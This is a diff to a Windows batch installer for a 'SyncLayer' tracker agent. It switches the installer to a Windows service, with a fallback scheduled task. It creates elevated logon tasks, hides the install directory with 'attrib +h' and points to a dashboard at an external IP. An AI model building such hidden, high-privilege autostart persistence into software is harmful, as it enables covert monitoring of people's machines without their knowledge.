@@ -20,7 +20,6 @@ set "SRC=%~dp0"
 set "DEST=%ProgramFiles%\SyncLayer"
 set "PY_DIR=%ProgramFiles%\Python312"
 set "PY=%PY_DIR%\python.exe"
-set "PYW=%PY_DIR%\pythonw.exe"
 set "PY_SETUP=%TEMP%\python-3.12.10-amd64.exe"
 set "LOG=%TEMP%\synclayer-install.log"
 
@@ -64,7 +63,6 @@ if not exist "%PY%" (
 
 :HAVE_PY
 echo Using: %PY%
-if not exist "%PYW%" set "PYW=%PY%"
 
 echo [3/6] pip packages
 "%PY%" -m pip install --upgrade pip >> "%LOG%" 2>&1
@@ -77,35 +75,39 @@ if errorlevel 1 (
 )
 "%PY%" -m pywin32_postinstall -install >> "%LOG%" 2>&1
 
-echo [4/6] Disable old service mode (if exists)
+echo [4/6] Windows service
 cd /d "%DEST%"
 "%PY%" tracker_service.py stop >> "%LOG%" 2>&1
 "%PY%" tracker_service.py remove >> "%LOG%" 2>&1
-sc stop SyncLayer >> "%LOG%" 2>&1
-sc delete SyncLayer >> "%LOG%" 2>&1
-
-echo [5/6] Create startup task (user session)
-schtasks /Delete /TN "SyncLayerAgent" /F >nul 2>&1
-schtasks /Create /F /TN "SyncLayerAgent" /TR "\"%PYW%\" \"%DEST%\app_main.py\"" /SC ONLOGON /RL HIGHEST /IT >> "%LOG%" 2>&1
+"%PY%" tracker_service.py install
 if errorlevel 1 (
-    echo ERROR: cannot create SyncLayerAgent task. See %LOG%
+    echo ERROR: service install failed
     pause
     exit /b 1
 )
 
-echo [6/6] Start agent now
-schtasks /Run /TN "SyncLayerAgent" >> "%LOG%" 2>&1
+echo [5/6] Start service
+"%PY%" tracker_service.py start
 if errorlevel 1 (
-    start "" "%PYW%" "%DEST%\app_main.py"
+    echo Service start failed. Starting agent in user session...
+    schtasks /Create /F /TN "SyncLayerAgent" /TR "\"%PY%\" \"%DEST%\run_test.py\"" /SC ONLOGON /RL HIGHEST /IT >> "%LOG%" 2>&1
+    start "SyncLayer" "%PY%" "%DEST%\run_test.py"
+    echo.
+    echo Agent window opened. Do not close it for this test.
+    echo Dashboard: http://201.51.8.127:8000
+    echo.
+    pause
+    exit /b 0
 )
 
+echo [6/6] Tray task
+schtasks /Create /F /TN "SyncLayerTray" /TR "\"%PY%\" \"%DEST%\tray_app.py\"" /SC ONLOGON /RL HIGHEST >> "%LOG%" 2>&1
 attrib +h "%DEST%" >nul 2>&1
 
 echo.
 echo ============================================
 echo  OK. SyncLayer installed.
 echo  Dashboard: http://201.51.8.127:8000
-echo  Autostart: task SyncLayerAgent on user logon.
 echo  Wait 1-2 minutes then refresh the page.
 echo ============================================
 echo.
